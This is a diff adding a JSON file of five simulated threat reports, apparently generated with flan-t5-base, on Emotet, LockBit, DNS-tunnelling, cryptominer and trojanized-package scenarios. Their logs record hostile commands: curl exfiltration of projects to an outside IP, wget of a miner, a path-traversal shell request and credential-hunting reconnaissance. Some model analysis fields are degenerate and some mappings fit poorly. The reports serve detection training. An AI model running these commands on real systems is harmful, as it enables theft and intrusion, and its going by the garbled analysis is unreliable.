@@ -1,0 +1,378 @@
+[
+  {
+    "report_metadata": {
+      "generated_at": "2026-03-29T04:35:37.485014+00:00",
+      "model_used": "google/flan-t5-base",
+      "scenario_id": "SC-001",
+      "scenario_name": "Emotet Phishing Campaign"
+    },
+    "threat_assessment": {
+      "severity": "HIGH",
+      "description": "Emotet malware delivered via phishing email with malicious macro-enabled Word document. The macro executes PowerShell to download and execute the Emotet payload, which establishes C2 communication.",
+      "malware_family": "Emotet",
+      "malware_type": "Banking Trojan / Loader"
+    },
+    "mitre_attck_mapping": {
+      "mapped_ttps": [
+        {
+          "technique_id": "T1566",
+          "technique_name": "Phishing",
+          "tactic": "Initial Access"
+        },
+        {
+          "technique_id": "T1204",
+          "technique_name": "User Execution",
+          "tactic": "Execution"
+        },
+        {
+          "technique_id": "T1041",
+          "technique_name": "Exfiltration Over C2 Channel",
+          "tactic": "Exfiltration"
+        },
+        {
+          "technique_id": "T1059.001",
+          "technique_name": "PowerShell",
+          "tactic": "Execution"
+        },
+        {
+          "technique_id": "T1486",
+          "technique_name": "Data Encrypted for Impact",
+          "tactic": "Impact"
+        }
+      ],
+      "tactic_coverage": [
+        "Exfiltration",
+        "Execution",
+        "Impact",
+        "Initial Access"
+      ]
+    },
+    "indicators_of_compromise": {
+      "ip_addresses": [
+        "203.0.113.45",
+        "185.215.113.67",
+        "91.243.44.21"
+      ],
+      "domains": [
+        "trusted-supplier.com",
+        "update-service.xyz"
+      ],
+      "urls": [
+        "https://185.215.113.67/update/config.php",
+        "http://91.243.44.21:8080/gate.php"
+      ],
+      "file_hashes": [
+        "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
+        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+      ],
+      "email_addresses": [
+        "invoice@trusted-supplier.com"
+      ],
+      "registry_keys": [
+        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate"
+      ]
+    },
+    "llm_analysis": "Type: Banking Trojan/Task",
+    "network_activity_summary": "Network activity observed:\n  - [2025-03-15T08:23:41Z] SMTP 192.168.1.105:49152 -> 203.0.113.45:25 (inbound, 285400 bytes) | From: invoice@trusted-supplier.com; Subject: Urgent Invoice #INV-2025-8834; Attachment: Invoice_March2025.docm\n  - [2025-03-15T08:31:15Z] HTTPS 192.168.1.105:49200 -> 185.215.113.67:443 (outbound, 524288 bytes) | GET /update/config.php?id=a8f3b2 HTTP/1.1; User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0)\n  - [2025-03-15T08:35:00Z] HTTP 192.168.1.105:49210 -> 91.243.44.21:8080 (outbound, 1048 bytes) | POST /gate.php; Content-Type: application/x-www-form-urlencoded; Cookie: session=base64_encoded_system_info\n  - [2025-03-15T08:40:00Z] HTTP 192.168.1.105:49215 -> 91.243.44.21:8080 (outbound, 2096 bytes) | POST /gate.php; beacon interval 300s; encrypted payload with system enumeration data",
+    "honeypot_activity_summary": "Honeypot interactions:\n  - [2025-03-15T08:22:00Z] GenPot-SMTP: SMTP connection from 203.0.113.45 attempting to relay phishing emails. Commands: EHLO mail.trusted-supplier.com, MAIL FROM:<invoice@trusted-supplier.com>, RCPT TO: <multiple_recipients>"
+  },
+  {
+    "report_metadata": {
+      "generated_at": "2026-03-29T04:36:01.577964+00:00",
+      "model_used": "google/flan-t5-base",
+      "scenario_id": "SC-002",
+      "scenario_name": "LockBit Ransomware Attack"
+    },
+    "threat_assessment": {
+      "severity": "CRITICAL",
+      "description": "LockBit 3.0 ransomware attack initiated via brute-forced RDP credentials. Attacker laterally moves across the network using SMB, deploys ransomware on multiple endpoints, deletes shadow copies, and encrypts files.",
+      "malware_family": "LockBit",
+      "malware_type": "Ransomware"
+    },
+    "mitre_attck_mapping": {
+      "mapped_ttps": [
+        {
+          "technique_id": "T1486",
+          "technique_name": "Data Encrypted for Impact",
+          "tactic": "Impact"
+        },
+        {
+          "technique_id": "T1021",
+          "technique_name": "Remote Services",
+          "tactic": "Lateral Movement"
+        },
+        {
+          "technique_id": "T1573",
+          "technique_name": "Encrypted Channel",
+          "tactic": "Command and Control"
+        },
+        {
+          "technique_id": "T1219",
+          "technique_name": "Remote Access Software",
+          "tactic": "Command and Control"
+        },
+        {
+          "technique_id": "T1041",
+          "technique_name": "Exfiltration Over C2 Channel",
+          "tactic": "Exfiltration"
+        }
+      ],
+      "tactic_coverage": [
+        "Command and Control",
+        "Impact",
+        "Lateral Movement",
+        "Exfiltration"
+      ]
+    },
+    "indicators_of_compromise": {
+      "ip_addresses": [
+        "45.155.205.99",
+        "185.100.87.41"
+      ],
+      "domains": [
+        "lockbit-decryptor.onion"
+      ],
+      "urls": [
+        "https://185.100.87.41/upload"
+      ],
+      "file_hashes": [
+        "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9",
+        "7d5a9f2b3c4e1d6a8f0b2c4e6a8d0f2b4a6c8e0d2f4a6b8c0e2d4f6a8b0c2d"
+      ],
+      "file_extensions_encrypted": [
+        ".lockbit3"
+      ],
+      "ransom_note_filename": "Restore-My-Files.txt",
+      "tools_used": [
+        "PsExec",
+        "Mimikatz",
+        "AdFind"
+      ]
+    },
+    "llm_analysis": "[2025-03-20T02:15:00Z] RDP 45.155.205.99:54321 -> 10.0.0.5:3389 (inbound, 156000 bytes) | Multiple failed RDP authentication attempts (847 attempts in 30 minutes) followed by successful login as 'administrator'] [2025-03-20T02:48:00Z] SMB 10.0.0.5:49301 -> 10.0.0.10:445 (lateral, 2097152 bytes) | SMB file copy: lockbit3.exe to 10.0.0.10C$WindowsTempsvchost.exe] [2025-03-20T02:50:00Z] SMB 10.0.0.5:49302 -> 10.0.0.15:445 (lateral, 2097152 bytes) | SMB file copy: lockbit3.exe to 10.0.0.15C$WindowsTempsvchost.exe] [2025-03-20T03:00:00Z] HTTPS 10.0.0.5:49400 -> 185.100.87.41:443 (outbound, 52428800 bytes) | Exfiltration of compressed archive (sensitive_data.7z) to external server before encryption]",
+    "network_activity_summary": "Network activity observed:\n  - [2025-03-20T02:15:00Z] RDP 45.155.205.99:54321 -> 10.0.0.5:3389 (inbound, 156000 bytes) | Multiple failed RDP authentication attempts (847 attempts in 30 minutes) followed by successful login as 'administrator'\n  - [2025-03-20T02:48:00Z] SMB 10.0.0.5:49301 -> 10.0.0.10:445 (lateral, 2097152 bytes) | SMB file copy: lockbit3.exe to \\\\10.0.0.10\\C$\\Windows\\Temp\\svchost.exe\n  - [2025-03-20T02:50:00Z] SMB 10.0.0.5:49302 -> 10.0.0.15:445 (lateral, 2097152 bytes) | SMB file copy: lockbit3.exe to \\\\10.0.0.15\\C$\\Windows\\Temp\\svchost.exe\n  - [2025-03-20T03:00:00Z] HTTPS 10.0.0.5:49400 -> 185.100.87.41:443 (outbound, 52428800 bytes) | Exfiltration of compressed archive (sensitive_data.7z) to external server before encryption\n  - [2025-03-20T03:15:00Z] SMB 10.0.0.5:49500 -> 10.0.0.255:445 (lateral, 4096 bytes) | WMI remote execution to trigger ransomware on all compromised endpoints simultaneously",
+    "honeypot_activity_summary": "Honeypot interactions:\n  - [2025-03-20T02:00:00Z] GenPot-RDP: RDP brute force detected from 45.155.205.99 targeting multiple honeypot IPs. Commands: Multiple NLA authentication attempts with common usernames: admin, administrator, user, backup"
+  },
+  {
+    "report_metadata": {
+      "generated_at": "2026-03-29T04:36:07.903713+00:00",
+      "model_used": "google/flan-t5-base",
+      "scenario_id": "SC-003",
+      "scenario_name": "APT-Style Data Exfiltration"
+    },
+    "threat_assessment": {
+      "severity": "CRITICAL",
+      "description": "Advanced persistent threat operation using spearphishing with a weaponized PDF to deliver a DLL sideloading payload. The attacker performs reconnaissance, stages data, and exfiltrates through DNS tunneling to evade detection.",
+      "malware_family": "ShadowBroker Custom RAT",
+      "malware_type": "Remote Access Trojan (RAT)"
+    },
+    "mitre_attck_mapping": {
+      "mapped_ttps": [
+        {
+          "technique_id": "T1190",
+          "technique_name": "Exploit Public-Facing Application",
+          "tactic": "Initial Access"
+        },
+        {
+          "technique_id": "T1041",
+          "technique_name": "Exfiltration Over C2 Channel",
+          "tactic": "Exfiltration"
+        },
+        {
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "tactic": "Command and Control"
+        },
+        {
+          "technique_id": "T1048",
+          "technique_name": "Exfiltration Over Alternative Protocol",
+          "tactic": "Exfiltration"
+        },
+        {
+          "technique_id": "T1071",
+          "technique_name": "Application Layer Protocol",
+          "tactic": "Command and Control"
+        }
+      ],
+      "tactic_coverage": [
+        "Command and Control",
+        "Exfiltration",
+        "Initial Access"
+      ]
+    },
+    "indicators_of_compromise": {
+      "ip_addresses": [
+        "104.21.45.112"
+      ],
+      "domains": [
+        "evil-analytics.com",
+        "data.evil-analytics.com",
+        "exfil.evil-analytics.com"
+      ],
+      "urls": [
+        "https://104.21.45.112/docs/Q1_Financial_Report.pdf"
+      ],
+      "file_hashes": [
+        "b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3",
+        "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2"
+      ],
+      "dns_tunneling_domains": [
+        "*.data.evil-analytics.com"
+      ],
+      "scheduled_tasks": [
+        "AdobeUpdateTask"
+      ]
+    },
+    "llm_analysis": "[2025-03-10T14:05:00Z] HTTPS 192.168.10.50:49100 -> 104.21.45.112:443 (outbound, 1572864 bytes) | Download of weaponized PDF (Q1_Financial_Report.pdf) from compromised legitimate website",
+    "network_activity_summary": "Network activity observed:\n  - [2025-03-10T14:05:00Z] HTTPS 192.168.10.50:49100 -> 104.21.45.112:443 (outbound, 1572864 bytes) | Download of weaponized PDF (Q1_Financial_Report.pdf) from compromised legitimate website\n  - [2025-03-10T14:12:00Z] DNS 192.168.10.50:49150 -> 192.168.10.1:53 (outbound, 256 bytes) | DNS query: aW5pdGlhbF9jaGVja19pbg==.data.evil-analytics.com (base64 initial check-in encoded in subdomain)\n  - [2025-03-11T09:00:00Z] DNS 192.168.10.50:49200 -> 192.168.10.1:53 (outbound, 4194304 bytes) | High volume DNS TXT queries to *.data.evil-analytics.com (2,847 queries in 1 hour - DNS tunneling pattern)\n  - [2025-03-11T10:30:00Z] SMB 192.168.10.50:49300 -> 192.168.10.20:445 (lateral, 0 bytes) | Access to file shares: \\\\fileserver\\finance\\*, \\\\fileserver\\hr\\confidential\\*\n  - [2025-03-12T20:00:00Z] DNS 192.168.10.50:49500 -> 192.168.10.1:53 (outbound, 104857600 bytes) | Sustained DNS exfiltration: encoded chunks of collected documents via TXT record queries to exfil.evil-analytics.com",
+    "honeypot_activity_summary": "Honeypot interactions:\n  - [2025-03-10T14:11:00Z] GenPot-DNS: Unusual DNS query patterns detected - high entropy subdomain names consistent with DNS tunneling. Commands: TXT query for c2check.evil-analytics.com, A query for update.evil-analytics.com\n  - [2025-03-11T10:35:00Z] GenPot-Fileserver: Unauthorized access attempt to honeypot file shares from 192.168.10.50. Commands: SMB TreeConnect to \\\\honeypot-fs\\confidential, Directory listing of \\\\honeypot-fs\\confidential\\contracts"
+  },
+  {
+    "report_metadata": {
+      "generated_at": "2026-03-29T04:36:15.940270+00:00",
+      "model_used": "google/flan-t5-base",
+      "scenario_id": "SC-004",
+      "scenario_name": "Cryptominer Deployment via Web Exploit"
+    },
+    "threat_assessment": {
+      "severity": "MEDIUM",
+      "description": "Exploitation of a vulnerable Apache web server (CVE-2025-XXXX) to deploy XMRig cryptocurrency miner. The attacker establishes persistence via cron jobs and attempts to spread to other internal servers.",
+      "malware_family": "XMRig",
+      "malware_type": "Cryptocurrency Miner"
+    },
+    "mitre_attck_mapping": {
+      "mapped_ttps": [
+        {
+          "technique_id": "T1496",
+          "technique_name": "Resource Hijacking",
+          "tactic": "Impact"
+        },
+        {
+          "technique_id": "T1190",
+          "technique_name": "Exploit Public-Facing Application",
+          "tactic": "Initial Access"
+        },
+        {
+          "technique_id": "T1053",
+          "technique_name": "Scheduled Task/Job",
+          "tactic": "Persistence"
+        },
+        {
+          "technique_id": "T1573",
+          "technique_name": "Encrypted Channel",
+          "tactic": "Command and Control"
+        },
+        {
+          "technique_id": "T1059",
+          "technique_name": "Command and Scripting Interpreter",
+          "tactic": "Execution"
+        }
+      ],
+      "tactic_coverage": [
+        "Command and Control",
+        "Persistence",
+        "Impact",
+        "Execution",
+        "Initial Access"
+      ]
+    },
+    "indicators_of_compromise": {
+      "ip_addresses": [
+        "77.91.68.29",
+        "185.196.8.90"
+      ],
+      "domains": [
+        "pool.supportxmr.com"
+      ],
+      "urls": [
+        "https://185.196.8.90/bins/xmrig_linux64"
+      ],
+      "file_hashes": [
+        "c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4",
+        "2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3"
+      ],
+      "mining_wallet": "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A",
+      "cron_entries": [
+        "@reboot /tmp/.cache/systemd-update"
+      ],
+      "file_paths": [
+        "/tmp/.cache/systemd-update"
+      ]
+    },
+    "llm_analysis": "[2025-03-18T11:01:00Z] HTTP 77.91.68.29:44123 -> 10.10.10.80:80 (inbound, 512 bytes) | GET /cgi-bin/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1 (path traversal RCE exploit attempt)",
+    "network_activity_summary": "Network activity observed:\n  - [2025-03-18T11:00:00Z] HTTP 77.91.68.29:44123 -> 10.10.10.80:80 (inbound, 512 bytes) | GET /cgi-bin/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1 (path traversal RCE exploit attempt)\n  - [2025-03-18T11:00:05Z] HTTP 10.10.10.80:80 -> 77.91.68.29:44123 (outbound, 128 bytes) | 200 OK - Command execution successful (uid=33 www-data)\n  - [2025-03-18T11:01:00Z] HTTPS 10.10.10.80:49600 -> 185.196.8.90:443 (outbound, 6291456 bytes) | wget https://185.196.8.90/bins/xmrig_linux64 -O /tmp/.cache/systemd-update\n  - [2025-03-18T11:05:00Z] Stratum 10.10.10.80:49700 -> pool.supportxmr.com:3333 (outbound, 0 bytes) | XMRig mining connection: {\"method\":\"login\",\"params\":{\"login\":\"44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A\"}}\n  - [2025-03-18T11:10:00Z] TCP 10.10.10.80:0 -> 10.10.10.0/24:22 (lateral, 2048 bytes) | SSH port scan across internal subnet (scanning for additional targets)",
+    "honeypot_activity_summary": "Honeypot interactions:\n  - [2025-03-18T10:55:00Z] GenPot-HTTP: HTTP exploit attempts from 77.91.68.29 targeting Apache path traversal vulnerability. Commands: GET /cgi-bin/%2e%2e/etc/passwd, GET /cgi-bin/%2e%2e/%2e%2e/bin/sh?echo+test"
+  },
+  {
+    "report_metadata": {
+      "generated_at": "2026-03-29T04:36:23.124877+00:00",
+      "model_used": "google/flan-t5-base",
+      "scenario_id": "SC-005",
+      "scenario_name": "Supply Chain Compromise via Trojanized Package"
+    },
+    "threat_assessment": {
+      "severity": "HIGH",
+      "description": "A popular open-source Python package is trojanized with a reverse shell payload. When developers install the compromised package, it establishes a reverse shell connection and begins staging sensitive source code and credentials for exfiltration.",
+      "malware_family": "PyPI-Backdoor",
+      "malware_type": "Supply Chain Malware / Reverse Shell"
+    },
+    "mitre_attck_mapping": {
+      "mapped_ttps": [
+        {
+          "technique_id": "T1573",
+          "technique_name": "Encrypted Channel",
+          "tactic": "Command and Control"
+        },
+        {
+          "technique_id": "T1041",
+          "technique_name": "Exfiltration Over C2 Channel",
+          "tactic": "Exfiltration"
+        },
+        {
+          "technique_id": "T1190",
+          "technique_name": "Exploit Public-Facing Application",
+          "tactic": "Initial Access"
+        },
+        {
+          "technique_id": "T1048",
+          "technique_name": "Exfiltration Over Alternative Protocol",
+          "tactic": "Exfiltration"
+        },
+        {
+          "technique_id": "T1059",
+          "technique_name": "Command and Scripting Interpreter",
+          "tactic": "Execution"
+        }
+      ],
+      "tactic_coverage": [
+        "Initial Access",
+        "Command and Control",
+        "Execution",
+        "Exfiltration"
+      ]
+    },
+    "indicators_of_compromise": {
+      "ip_addresses": [
+        "198.51.100.78"
+      ],
+      "domains": [],
+      "urls": [
+        "https://198.51.100.78/upload"
+      ],
+      "file_hashes": [
+        "e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6",
+        "3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4"
+      ],
+      "malicious_packages": [
+        "requests-toolkit==2.31.1"
+      ],
+      "c2_ports": [
+        4444
+      ],
+      "ssh_keys_compromised": true
+    },
+    "llm_analysis": "[2025-03-22T16:00:00Z] HTTPS 192.168.5.30:49800 -> pypi.org:443 (outbound, 45000 bytes) | pip install requests-toolkit==2.31.1 (trojanized package mimicking popular 'requests' library)",
+    "network_activity_summary": "Network activity observed:\n  - [2025-03-22T16:00:00Z] HTTPS 192.168.5.30:49800 -> pypi.org:443 (outbound, 45000 bytes) | pip install requests-toolkit==2.31.1 (trojanized package mimicking popular 'requests' library)\n  - [2025-03-22T16:00:30Z] TCP 192.168.5.30:49850 -> 198.51.100.78:4444 (outbound, 512 bytes) | Reverse shell connection established (Python socket connect back to attacker C2)\n  - [2025-03-22T16:05:00Z] TCP 192.168.5.30:49850 -> 198.51.100.78:4444 (bidirectional, 4096 bytes) | Commands received: whoami; hostname; cat /etc/passwd; env | grep -i key; find / -name '*.pem' -o -name '*.key' 2>/dev/null\n  - [2025-03-22T16:30:00Z] HTTPS 192.168.5.30:49860 -> 198.51.100.78:443 (outbound, 209715200 bytes) | tar czf - /home/developer/projects/ | openssl enc -aes-256-cbc -pass pass:compromised | curl -X POST https://198.51.100.78/upload -d @-\n  - [2025-03-22T17:00:00Z] SSH 192.168.5.30:49900 -> 192.168.5.31:22 (lateral, 1024 bytes) | SSH connection using stolen SSH key from developer machine to internal Git server",
+    "honeypot_activity_summary": "Honeypot interactions:\n  - [2025-03-22T17:05:00Z] GenPot-SSH: SSH login attempt from 192.168.5.30 using stolen developer credentials to honeypot server. Commands: git clone git@honeypot-git:internal/proprietary-code.git, cat /etc/shadow"
+  }
+]
